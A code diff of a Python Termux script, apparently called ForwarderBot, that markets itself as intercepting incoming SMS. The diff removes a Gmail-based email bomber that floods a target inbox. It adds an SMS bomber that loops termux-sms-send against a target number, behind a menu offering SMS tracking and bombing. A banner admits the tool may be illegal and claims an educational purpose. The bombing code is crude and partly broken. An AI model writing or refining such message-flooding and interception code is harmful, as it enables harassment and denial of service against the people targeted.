@@ -1,9 +1,9 @@
 import os
+import subprocess
 import time
-import random
 import requests
-import smtplib
-from colorama import Fore
+from colorama import Fore, init
+init(autoreset=True)
 
 # Colors
 R = Fore.RED
@@ -23,7 +23,9 @@ def banner():
 ██╔══╝  ██║     ██║   ██║██║███╗██║██╔══██║██║  ██║██╔══╝  
 ██║     ╚██████╗╚██████╔╝╚███╔███╔╝██║  ██║██████╔╝███████╗
 ╚═╝      ╚═════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
-    {W}""")
+    {W}
+    {G}Made by AllahAkbar313{W}
+    """)
     print(f"{G}Welcome to ForwarderBot!{W}")
     print(f"{Y}This tool forwards incoming SMS to Termux in real-time.{W}")
     print(f"{R}⚠ WARNING: This could be illegal! Use only for educational purposes! ⚠{W}")
@@ -69,65 +71,24 @@ def start_tracking(phone_number):
     except KeyboardInterrupt:
         print(f"{R}\nTracking stopped. Exiting...{W}")
 
-# Email Bomber
-def email_bomber():
-    print(f"{Y}Enter the email to bomb:{W}")
-    email = input(f"{C}Email: {W}")
-    msg = input(f"{C}Message: {W}")
-    email_count = int(input(f"{C}How many emails to send? {W}"))
-    
-    try:
-        server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.starttls()
-        email_address = input(f"{C}Enter your Gmail address: {W}")
-        email_password = input(f"{C}Enter your Gmail password: {W}")
-        server.login(email_address, email_password)
-        
-        for i in range(email_count):
-            server.sendmail(email_address, email, msg)
-            print(f"{G}[+] Email sent {i + 1} times!{W}")
-            time.sleep(random.randint(1, 5))
-    except Exception as e:
-        print(f"{R}[!] Error: {e}{W}")
-    finally:
-        server.quit()
-
-# SMS Bomber
-def sms_bomber():
-    print(f"{Y}Enter the phone number to bomb (country code + number):{W}")
-    phone_number = input(f"{C}Phone Number: {W}")
-    message = input(f"{C}Enter the message to send: {W}")
-    number_of_sms = int(input(f"{C}Enter number of SMS to send: {W}"))
-    
-    for i in range(number_of_sms):
-        # Replace this with actual API or service to send SMS
-        print(f"{G}[+] SMS sent to {phone_number}! {i + 1}/{number_of_sms} sent{W}")
-        time.sleep(random.randint(1, 3))  # Random delay for SMS bombing
+# SMS Bombing Function
+def sms_bomber(phone_number):
+    print(f"{Y}SMS Bombing started on {phone_number}...{W}")
+    # Add your custom bombing logic here, delayed or multiple messages to bomb the target
+    for i in range(10):  # This example sends 10 messages
+        subprocess.run(f"termux-sms-send {phone_number} 'This is a test bomb message!'")
 
 # Main Function
-def main():
+if __name__ == "__main__":
     banner()
     input(f"{Y}Press ENTER to continue...{W}")
+    phone_number = get_phone_number()
+    option = input(f"{C}Choose Option:\n1. Track SMS\n2. SMS Bomber\n{W}")
     
-    print(f"{C}Select an option:{W}")
-    print(f"{G}[1] SMS Forwarder")
-    print(f"{Y}[2] SMS Bomber")
-    print(f"{B}[3] Email Bomber")
-    print(f"{C}[4] IP Tracker")
-    choice = input(f"{W}Choose option: {C}")
-
-    if choice == '1':
-        phone_number = get_phone_number()
+    if option == "1":
         start_tracking(phone_number)
-    elif choice == '2':
-        sms_bomber()
-    elif choice == '3':
-        email_bomber()
-    elif choice == '4':
-        print(f"{Y}IP Tracker not implemented yet!{W}")
+    elif option == "2":
+        sms_bomber(phone_number)
     else:
-        print(f"{R}[!] Invalid option!{W}")
-
-# Run the main function
-if __name__ == "__main__":
-    main()
+        print(f"{R}Invalid option. Exiting...{W}")
+        exit()
